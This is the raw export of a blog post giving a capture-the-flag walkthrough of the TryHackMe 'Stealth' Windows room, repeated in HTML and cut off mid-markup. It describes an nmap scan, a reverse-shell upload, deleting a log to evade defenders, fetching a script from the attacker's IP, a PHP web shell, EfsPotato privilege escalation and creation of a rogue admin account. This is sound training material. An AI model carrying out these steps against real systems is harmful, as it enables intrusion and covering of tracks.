L7a9Beya4aynWgHXegaCVP0CcA750BRf1Ax+tjpojoTJOarC0C1QibbDs0s6NbUY\n| Z1CakxCRQlENDRau+vqqhRMxlbEfayl1YICTfMe6j3hMnVeYiPjZECt2nSe92i2p\n| rnzpdZ4Xbe8tdDzGETQGkBdOCOKPk6/nh80ifpcjBQIDAQABoyQwIjATBgNVHSUE\n| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABB4\n| HKrRnIrik9ef1F3Ah6r4FsdpCmZ0vXLNixsqm8IY81fNcRTogc/WFytU9gylcxRk\n| LhoUqXwtQhKqMFOKcEh3Kq2+VMUvgxTxvDywFS4S02AlhWtafq8NBm5nfxxubuit\n| tRO3fvdQ7mKS2hWvapW9+guEt0zJZI3Ai/C4NIq5WpbLEGSJe6DHUwXaPyFiHNYy\n| 5j91hKUWbDnIy4TqiIPjhBjYhrTvi46fbGbqMpHelUGABzJ5LFfGjORMOWA1bRPz\n| wuaEP62Dimr42pzbLPIgGTmBwpIXlpKdcydbJnVORxY4AfpLV6ypt2EPYS2TpKbz\n| 4Fw5A8aWrShuerOI7mc=\n|_-----END CERTIFICATE-----\n5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n8000/tcp  open  http          syn-ack PHP cli server 5.5 or later\n|_http-title: 404 Not Found\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n8080/tcp  open  http          syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28\n|_http-title: PowerShell Script Analyser\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n8443/tcp  open  ssl/http      syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=localhost\n| Issuer: commonName=localhost\n| Public Key type: rsa\n| Public Key bits: 1024\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2009-11-10T23:48:47\n| Not valid after:  2019-11-08T23:48:47\n| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0\n| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6\n| -----BEGIN CERTIFICATE-----\n| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls\n| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD\n| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj\n| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o\n| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT\n| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD\n| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd\n| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL\n| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=\n|_-----END CERTIFICATE-----\n|_http-title: PowerShell Script Analyser\n| tls-alpn: \n|_  http/1.1\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49665/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49666/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49667/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49668/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49669/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49670/tcp open  msrpc         syn-ack Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 0s, deviation: 0s, median: -1s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 52662/tcp): CLEAN (Timeout)\n|   Check 2 (port 33712/tcp): CLEAN (Timeout)\n|   Check 3 (port 30307/udp): CLEAN (Timeout)\n|   Check 4 (port 41933/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time: \n|   date: 2023-11-30T18:28:10\n|_  start_date: N/A\n\n\n```\n## checking the site\n\n![](https://i.imgur.com/uV5DpSl.png)\n\nChecking the site out as described on tryhackme we are presented a site.\n\n![](https://i.imgur.com/JWMZg47.png)\n\nSo on the site we are only allowed to upload powershell scripts, we need to upload a script which will give us a reverse sehll to connect to the machine.\n\n## initial foothold\nGenerating a reverse shell with [revshells](http://revshells.com) and uploading it on the website we get a connection back. \n\n*Disclaimer*\n\nAfter uploading the script and using netcat as your listener you'll get a shell connection back but without the terminal instant which is *'funny'* to work with. \n![](https://i.imgur.com/FQKIuhp.png)\n\n\nA better shell instance that i got was from this guy [malw0re](https://github.com/malw0re/scriptures-). So after uploading we get a clean looking shell back. Searching the folders we land on the Desktop folder and there is a file called *encodedflag*.\n\nDecoding and reading the file we get some interesting message.\n\n![](https://i.imgur.com/kNofE1s.png)\n\nFollowing the decoded message and checking it out on the webpage we get an interesting message.\n![](https://i.imgur.com/JqHJOnC.png)\n\n## user level flag.\n\nChecking the documents file there is a directory called tasks inside it there's a file called log.txt and from the webpage response we need to remove the log file not to alert the blue team, removing the log file and reloading the webpage we get nothing so got stuck for a while.\nThen reading the *file.ps1* we see there is a directory hosting xampp\n\n![](https://i.imgur.com/ZaomI08.png)\n\nUnder the uploads directory, we identify the a log file removing it and refreshing the page we get the first flag.\n\n![](https://i.imgur.com/6C9PKha.png)\n\n![](https://i.imgur.com/o4vn183.png)\n\n## root level flag.\n\nHaving the user flag we need to look out for privesc vectors on the box and since it's a windows box i uploaded a powershell script that looks for some vectors.\n\n![](https://i.imgur.com/q5dzts3.png)\n\nThe command is downloading the (win-priv-check.ps1) from my attacker ip address using using the Invoke-WebRequest cmdlet and saving it locally as win.ps1. Running the script it identifies apache is running as admin.\n\n![](https://i.imgur.com/OifDB01.png)\n\nLet's check evader's privileges and check if we can abuse any privileges.\n\n![](https://i.imgur.com/a72wbxc.png)\n\nso we don't have any specific privilege that we can abuse so my next step was to upload a malicious php script to the webserver using pownyshell.\n\nchecking the privileges we see it's different from the output we go previously.\n\n![](https://i.imgur.com/A9Yszsw.png)\n\nAs we can see we can abuse the *\"SetImpersonatePrivilege\"* any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM [referenced from here.](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)\n\nSo our privesc vector are all relate to a potato exploit and after trying and failing i landed on the *\"efspotato\"* exploit which worked and elevate our privileges to NT SYSTEM!!\n\n![](https://i.imgur.com/F5WGaj8.png)\n\nTrying to get the admin flag we are face with some errors.\n\n![](https://i.imgur.com/wDnF2Xy.png)\n\nSo the next step was creating a user with admin privileges then rdp into the machine and get the machine.\n\n![](https://i.imgur.com/U29uu8P.png)\n\nLogin into the machine with the created user and get the flag\n\n![](https://i.imgur.com/jlALEK2.png)\n\nHope you learnt something new ✨","slug":"tryhackme/stealth","published":1,"updated":"2024-07-16T20:39:34.609Z","_id":"clyouz1j8000ewgjnbrp30ory","comments":1,"layout":"post","photos":[],"content":"<p><img src=\"https://i.imgur.com/gd7lkVU.png\"><br><a href=\"https://tryhackme.com/room/stealth\">stealth tryhackmeroom</a></p>\n<h2 id=\"nmap-scans\"><a href=\"#nmap-scans\" class=\"headerlink\" title=\"nmap scans\"></a>nmap scans</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT      STATE SERVICE       REASON  VERSION</span><br><span class=\"line\">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class=\"line\">445/tcp   open  microsoft-ds? syn-ack</span><br><span class=\"line\">3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class=\"line\">|_ssl-<span class=\"built_in\">date</span>: 2023-11-30T18:28:49+00:00; -1s from scanner time.</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: HOSTEVASION</span><br><span class=\"line\">|   NetBIOS_Domain_Name: HOSTEVASION</span><br><span class=\"line\">|   NetBIOS_Computer_Name: HOSTEVASION</span><br><span class=\"line\">|   DNS_Domain_Name: HostEvasion</span><br><span class=\"line\">|   DNS_Computer_Name: HostEvasion</span><br><span class=\"line\">|   Product_Version: 10.0.17763</span><br><span class=\"line\">|_  System_Time: 2023-11-30T18:28:10+00:00</span><br><span class=\"line\">| ssl-cert: Subject: commonName=HostEvasion</span><br><span class=\"line\">| Issuer: commonName=HostEvasion</span><br><span class=\"line\">| Public Key <span class=\"built_in\">type</span>: rsa</span><br><span class=\"line\">| Public Key bits: 2048</span><br><span class=\"line\">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class=\"line\">| Not valid before: 2023-07-28T19:06:15</span><br><span class=\"line\">| Not valid after:  2024-01-27T19:06:15</span><br><span class=\"line\">| MD5:   110c:1c21:e230:b7c7:41f5:4b6a:bf2b:9e6a</span><br><span class=\"line\">| SHA-1: 34ad:3702:1a0a:2054:88a9:ea0c:820b:da64:b1bd:fb56</span><br><span class=\"line\">| -----BEGIN CERTIFICATE-----</span><br><span class=\"line\">| MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW</span><br><span class=\"line\">| MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yMzA3MjgxOTA2MTVaFw0yNDAxMjcx</span><br><span class=\"line\">| OTA2MTVaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF</span><br><span class=\"line\">| AAOCAQ8AMIIBCgKCAQEA2tUyXSZT7x2YueFMia0tU6xweBIvbwEXw0MBCXtHEf9A</span><br><span class=\"line\">| LqZ6aiwNSsiLeW/kfBsqw6LArZNajuGggR2uj2HLGMn9Yx2RjnMSUaVWlJnB+j7s</span><br><span class=\"line\">| YsgeVOr3Y8rFv0EPD2M6tKEZ7Zh8HoaBifHR3qeNIx+n6YcYmSjb0mUQ5kQso7SS</span><br><span class=\"line\">| L7a9Beya4aynWgHXegaCVP0CcA750BRf1Ax+tjpojoTJOarC0C1QibbDs0s6NbUY</span><br><span class=\"line\">| Z1CakxCRQlENDRau+vqqhRMxlbEfayl1YICTfMe6j3hMnVeYiPjZECt2nSe92i2p</span><br><span class=\"line\">| rnzpdZ4Xbe8tdDzGETQGkBdOCOKPk6/nh80ifpcjBQIDAQABoyQwIjATBgNVHSUE</span><br><span class=\"line\">| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABB4</span><br><span class=\"line\">| HKrRnIrik9ef1F3Ah6r4FsdpCmZ0vXLNixsqm8IY81fNcRTogc/WFytU9gylcxRk</span><br><span class=\"line\">| LhoUqXwtQhKqMFOKcEh3Kq2+VMUvgxTxvDywFS4S02AlhWtafq8NBm5nfxxubuit</span><br><span class=\"line\">| tRO3fvdQ7mKS2hWvapW9+guEt0zJZI3Ai/C4NIq5WpbLEGSJe6DHUwXaPyFiHNYy</span><br><span class=\"line\">| 5j91hKUWbDnIy4TqiIPjhBjYhrTvi46fbGbqMpHelUGABzJ5LFfGjORMOWA1bRPz</span><br><span class=\"line\">| wuaEP62Dimr42pzbLPIgGTmBwpIXlpKdcydbJnVORxY4AfpLV6ypt2EPYS2TpKbz</span><br><span class=\"line\">| 4Fw5A8aWrShuerOI7mc=</span><br><span class=\"line\">|_-----END CERTIFICATE-----</span><br><span class=\"line\">5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class=\"line\">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class=\"line\">|_http-title: Not Found</span><br><span class=\"line\">8000/tcp  open  http          syn-ack PHP cli server 5.5 or later</span><br><span class=\"line\">|_http-title: 404 Not Found</span><br><span class=\"line\">| http-methods: </span><br><span class=\"line\">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class=\"line\">8080/tcp  open  http          syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span>)</span><br><span class=\"line\">| http-open-proxy: Potentially OPEN proxy.</span><br><span class=\"line\">|_Methods supported:CONNECTION</span><br><span class=\"line\">|_http-server-header: Apache/<span class=\"number\">2.4</span>.<span class=\"number\">56</span> (Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span></span><br><span class=\"line\">|_http-title: PowerShell Script Analyser</span><br><span class=\"line\">| http-methods: </span><br><span class=\"line\">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class=\"line\"><span class=\"number\">8443</span>/tcp  open  ssl/http      syn-ack Apache httpd <span class=\"number\">2.4</span>.<span class=\"number\">56</span> ((Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span>)</span><br><span class=\"line\">|_http-server-header: Apache/<span class=\"number\">2.4</span>.<span class=\"number\">56</span> (Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span></span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=localhost</span><br><span class=\"line\">| Issuer: commonName=localhost</span><br><span class=\"line\">| Public Key type: rsa</span><br><span class=\"line\">| Public Key bits: <span class=\"number\">1024</span></span><br><span class=\"line\">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2009</span>-<span class=\"number\">11</span>-<span class=\"number\">10</span>T23:<span class=\"number\">48</span>:<span class=\"number\">47</span></span><br><span class=\"line\">| Not valid after:  <span class=\"number\">2019</span>-<span class=\"number\">11</span>-<span class=\"number\">08</span>T23:<span class=\"number\">48</span>:<span class=\"number\">47</span></span><br><span class=\"line\">| MD5:   a0a4:<span class=\"number\">4</span>cc9:<span class=\"number\">9</span>e84:b26f:<span class=\"number\">9</span>e63:<span class=\"number\">9</span>f9e:d229:dee0</span><br><span class=\"line\">| SHA-<span class=\"number\">1</span>: b023:<span class=\"number\">8</span>c54:<span class=\"number\">7</span>a90:<span class=\"number\">5</span>bfa:<span class=\"number\">119</span>c:<span class=\"number\">4</span>e8b:acca:eacf:<span class=\"number\">3649</span>:<span class=\"number\">1</span>ff6</span><br><span class=\"line\">| -----BEGIN CERTIFICATE-----</span><br><span class=\"line\">| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls</span><br><span class=\"line\">| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD</span><br><span class=\"line\">| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj</span><br><span class=\"line\">| <span class=\"number\">7</span>K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o</span><br><span class=\"line\">| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT</span><br><span class=\"line\">| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD</span><br><span class=\"line\">| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+<span class=\"number\">9</span>whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd</span><br><span class=\"line\">| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL</span><br><span class=\"line\">| vVNbLkKxbK2XwUvu0RxoLdBMC/<span class=\"number\">89</span>HqrZ0ppiONuQ+X2MtxE=</span><br><span class=\"line\">|_-----END CERTIFICATE-----</span><br><span class=\"line\">|_http-title: PowerShell Script Analyser</span><br><span class=\"line\">| tls-alpn: </span><br><span class=\"line\">|_  http/<span class=\"number\">1.1</span></span><br><span class=\"line\">| http-methods: </span><br><span class=\"line\">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class=\"line\"><span class=\"number\">47001</span>/tcp open  http          syn-ack Microsoft HTTPAPI httpd <span class=\"number\">2.0</span> (SSDP/UPnP)</span><br><span class=\"line\">|_http-title: Not Found</span><br><span class=\"line\">|_http-server-header: Microsoft-HTTPAPI/<span class=\"number\">2.0</span></span><br><span class=\"line\"><span class=\"number\">49664</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49665</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49666</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49667</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49668</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49669</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49670</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">|_clock-skew: mean: <span class=\"number\">0</span>s, deviation: <span class=\"number\">0</span>s, median: -<span class=\"number\">1</span>s</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   <span class=\"number\">3</span>:<span class=\"number\">1</span>:<span class=\"number\">1</span>: </span><br><span class=\"line\">|_    Message signing enabled but not required</span><br><span class=\"line\">| p2p-conficker: </span><br><span class=\"line\">|   Checking for Conficker.C or higher...</span><br><span class=\"line\">|   Check <span class=\"number\">1</span> (port <span class=\"number\">52662</span>/tcp): CLEAN (Timeout)</span><br><span class=\"line\">|   Check <span class=\"number\">2</span> (port <span class=\"number\">33712</span>/tcp): CLEAN (Timeout)</span><br><span class=\"line\">|   Check <span class=\"number\">3</span> (port <span class=\"number\">30307</span>/udp): CLEAN (Timeout)</span><br><span class=\"line\">|   Check <span class=\"number\">4</span> (port <span class=\"number\">41933</span>/udp): CLEAN (Timeout)</span><br><span class=\"line\">|_  <span class=\"number\">0</span>/<span class=\"number\">4</span> checks are positive: Host is CLEAN or ports are blocked</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   date: <span class=\"number\">2023</span>-<span class=\"number\">11</span>-<span class=\"number\">30</span>T18:<span class=\"number\">28</span>:<span class=\"number\">10</span></span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"checking-the-site\"><a href=\"#checking-the-site\" class=\"headerlink\" title=\"checking the site\"></a>checking the site</h2><p><img src=\"https://i.imgur.com/uV5DpSl.png\"></p>\n<p>Checking the site out as described on tryhackme we are presented a site.</p>\n<p><img src=\"https://i.imgur.com/JWMZg47.png\"></p>\n<p>So on the site we are only allowed to upload powershell scripts, we need to upload a script which will give us a reverse sehll to connect to the machine.</p>\n<h2 id=\"initial-foothold\"><a href=\"#initial-foothold\" class=\"headerlink\" title=\"initial foothold\"></a>initial foothold</h2><p>Generating a reverse shell with <a href=\"http://revshells.com/\">revshells</a> and uploading it on the website we get a connection back. </p>\n<p><em>Disclaimer</em></p>\n<p>After uploading the script and using netcat as your listener you’ll get a shell connection back but without the terminal instant which is <em>‘funny’</em> to work with.<br><img src=\"https://i.imgur.com/FQKIuhp.png\"></p>\n<p>A better shell instance that i got was from this guy <a href=\"https://github.com/malw0re/scriptures-\">malw0re</a>. So after uploading we get a clean looking shell back. Searching the folders we land on the Desktop folder and there is a file called <em>encodedflag</em>.</p>\n<p>Decoding and reading the file we get some interesting message.</p>\n<p><img src=\"https://i.imgur.com/kNofE1s.png\"></p>\n<p>Following the decoded message and checking it out on the webpage we get an interesting message.<br><img src=\"https://i.imgur.com/JqHJOnC.png\"></p>\n<h2 id=\"user-level-flag\"><a href=\"#user-level-flag\" class=\"headerlink\" title=\"user level flag.\"></a>user level flag.</h2><p>Checking the documents file there is a directory called tasks inside it there’s a file called log.txt and from the webpage response we need to remove the log file not to alert the blue team, removing the log file and reloading the webpage we get nothing so got stuck for a while.<br>Then reading the <em>file.ps1</em> we see there is a directory hosting xampp</p>\n<p><img src=\"https://i.imgur.com/ZaomI08.png\"></p>\n<p>Under the uploads directory, we identify the a log file removing it and refreshing the page we get the first flag.</p>\n<p><img src=\"https://i.imgur.com/6C9PKha.png\"></p>\n<p><img src=\"https://i.imgur.com/o4vn183.png\"></p>\n<h2 id=\"root-level-flag\"><a href=\"#root-level-flag\" class=\"headerlink\" title=\"root level flag.\"></a>root level flag.</h2><p>Having the user flag we need to look out for privesc vectors on the box and since it’s a windows box i uploaded a powershell script that looks for some vectors.</p>\n<p><img src=\"https://i.imgur.com/q5dzts3.png\"></p>\n<p>The command is downloading the (win-priv-check.ps1) from my attacker ip address using using the Invoke-WebRequest cmdlet and saving it locally as win.ps1. Running the script it identifies apache is running as admin.</p>\n<p><img src=\"https://i.imgur.com/OifDB01.png\"></p>\n<p>Let’s check evader’s privileges and check if we can abuse any privileges.</p>\n<p><img src=\"https://i.imgur.com/a72wbxc.png\"></p>\n<p>so we don’t have any specific privilege that we can abuse so my next step was to upload a malicious php script to the webserver using pownyshell.</p>\n<p>checking the privileges we see it’s different from the output we go previously.</p>\n<p><img src=\"https://i.imgur.com/A9Yszsw.png\"></p>\n<p>As we can see we can abuse the <em>“SetImpersonatePrivilege”</em> any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM <a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens\">referenced from here.</a></p>\n<p>So our privesc vector are all relate to a potato exploit and after trying and failing i landed on the <em>“efspotato”</em> exploit which worked and elevate our privileges to NT SYSTEM!!</p>\n<p><img src=\"https://i.imgur.com/F5WGaj8.png\"></p>\n<p>Trying to get the admin flag we are face with some errors.</p>\n<p><img src=\"https://i.imgur.com/wDnF2Xy.png\"></p>\n<p>So the next step was creating a user with admin privileges then rdp into the machine and get the machine.</p>\n<p><img src=\"https://i.imgur.com/U29uu8P.png\"></p>\n<p>Login into the machine with the created user and get the flag</p>\n<p><img src=\"https://i.imgur.com/jlALEK2.png\"></p>\n<p>Hope you learnt something new ✨</p>\n","cover":false,"excerpt":"","more":"<p><img src=\"https://i.imgur.com/gd7lkVU.png\"><br><a href=\"https://tryhackme.com/room/stealth\">stealth tryhackmeroom</a></p>\n<h2 id=\"nmap-scans\"><a href=\"#nmap-scans\" class=\"headerlink\" title=\"nmap scans\"></a>nmap scans</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">PORT      STATE SERVICE       REASON  VERSION</span><br><span class=\"line\">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class=\"line\">445/tcp   open  microsoft-ds? syn-ack</span><br><span class=\"line\">3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class=\"line\">|_ssl-<span class=\"built_in\">date</span>: 2023-11-30T18:28:49+00:00; -1s from scanner time.</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: HOSTEVASION</span><br><span class=\"line\">|   NetBIOS_Domain_Name: HOSTEVASION</span><br><span class=\"line\">|   NetBIOS_Computer_Name: HOSTEVASION</span><br><span class=\"line\">|   DNS_Domain_Name: HostEvasion</span><br><span class=\"line\">|   DNS_Computer_Name: HostEvasion</span><br><span class=\"line\">|   Product_Version: 10.0.17763</span><br><span class=\"line\">|_  System_Time: 2023-11-30T18:28:10+00:00</span><br><span class=\"line\">| ssl-cert: Subject: commonName=HostEvasion</span><br><span class=\"line\">| Issuer: commonName=HostEvasion</span><br><span class=\"line\">| Public Key <span class=\"built_in\">type</span>: rsa</span><br><span class=\"line\">| Public Key bits: 2048</span><br><span class=\"line\">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class=\"line\">| Not valid before: 2023-07-28T19:06:15</span><br><span class=\"line\">| Not valid after:  2024-01-27T19:06:15</span><br><span class=\"line\">| MD5:   110c:1c21:e230:b7c7:41f5:4b6a:bf2b:9e6a</span><br><span class=\"line\">| SHA-1: 34ad:3702:1a0a:2054:88a9:ea0c:820b:da64:b1bd:fb56</span><br><span class=\"line\">| -----BEGIN CERTIFICATE-----</span><br><span class=\"line\">| MIIC2jCCAcKgAwIBAgIQMIOcafxeh79B5cu+rs/taDANBgkqhkiG9w0BAQsFADAW</span><br><span class=\"line\">| MRQwEgYDVQQDEwtIb3N0RXZhc2lvbjAeFw0yMzA3MjgxOTA2MTVaFw0yNDAxMjcx</span><br><span class=\"line\">| OTA2MTVaMBYxFDASBgNVBAMTC0hvc3RFdmFzaW9uMIIBIjANBgkqhkiG9w0BAQEF</span><br><span class=\"line\">| AAOCAQ8AMIIBCgKCAQEA2tUyXSZT7x2YueFMia0tU6xweBIvbwEXw0MBCXtHEf9A</span><br><span class=\"line\">| LqZ6aiwNSsiLeW/kfBsqw6LArZNajuGggR2uj2HLGMn9Yx2RjnMSUaVWlJnB+j7s</span><br><span class=\"line\">| YsgeVOr3Y8rFv0EPD2M6tKEZ7Zh8HoaBifHR3qeNIx+n6YcYmSjb0mUQ5kQso7SS</span><br><span class=\"line\">| L7a9Beya4aynWgHXegaCVP0CcA750BRf1Ax+tjpojoTJOarC0C1QibbDs0s6NbUY</span><br><span class=\"line\">| Z1CakxCRQlENDRau+vqqhRMxlbEfayl1YICTfMe6j3hMnVeYiPjZECt2nSe92i2p</span><br><span class=\"line\">| rnzpdZ4Xbe8tdDzGETQGkBdOCOKPk6/nh80ifpcjBQIDAQABoyQwIjATBgNVHSUE</span><br><span class=\"line\">| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBABB4</span><br><span class=\"line\">| HKrRnIrik9ef1F3Ah6r4FsdpCmZ0vXLNixsqm8IY81fNcRTogc/WFytU9gylcxRk</span><br><span class=\"line\">| LhoUqXwtQhKqMFOKcEh3Kq2+VMUvgxTxvDywFS4S02AlhWtafq8NBm5nfxxubuit</span><br><span class=\"line\">| tRO3fvdQ7mKS2hWvapW9+guEt0zJZI3Ai/C4NIq5WpbLEGSJe6DHUwXaPyFiHNYy</span><br><span class=\"line\">| 5j91hKUWbDnIy4TqiIPjhBjYhrTvi46fbGbqMpHelUGABzJ5LFfGjORMOWA1bRPz</span><br><span class=\"line\">| wuaEP62Dimr42pzbLPIgGTmBwpIXlpKdcydbJnVORxY4AfpLV6ypt2EPYS2TpKbz</span><br><span class=\"line\">| 4Fw5A8aWrShuerOI7mc=</span><br><span class=\"line\">|_-----END CERTIFICATE-----</span><br><span class=\"line\">5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class=\"line\">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class=\"line\">|_http-title: Not Found</span><br><span class=\"line\">8000/tcp  open  http          syn-ack PHP cli server 5.5 or later</span><br><span class=\"line\">|_http-title: 404 Not Found</span><br><span class=\"line\">| http-methods: </span><br><span class=\"line\">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class=\"line\">8080/tcp  open  http          syn-ack Apache httpd 2.4.56 ((Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span>)</span><br><span class=\"line\">| http-open-proxy: Potentially OPEN proxy.</span><br><span class=\"line\">|_Methods supported:CONNECTION</span><br><span class=\"line\">|_http-server-header: Apache/<span class=\"number\">2.4</span>.<span class=\"number\">56</span> (Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span></span><br><span class=\"line\">|_http-title: PowerShell Script Analyser</span><br><span class=\"line\">| http-methods: </span><br><span class=\"line\">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class=\"line\"><span class=\"number\">8443</span>/tcp  open  ssl/http      syn-ack Apache 